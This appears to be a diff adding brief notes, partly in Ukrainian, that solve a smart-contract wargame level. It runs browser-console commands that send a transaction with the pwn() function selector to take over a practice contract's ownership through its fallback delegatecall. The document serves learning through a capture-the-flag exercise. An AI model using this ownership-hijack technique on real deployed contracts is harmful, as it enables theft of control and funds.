@@ -1,0 +1,10 @@
+GetInstance
+В консолі браузера
+await contract.owner()
+
+await contract.sendTransaction({from: player, data: web3.eth.abi.encodeFunctionSignature('pwn()')})
+
+await contract.owner()
+
+SUBMIT
+
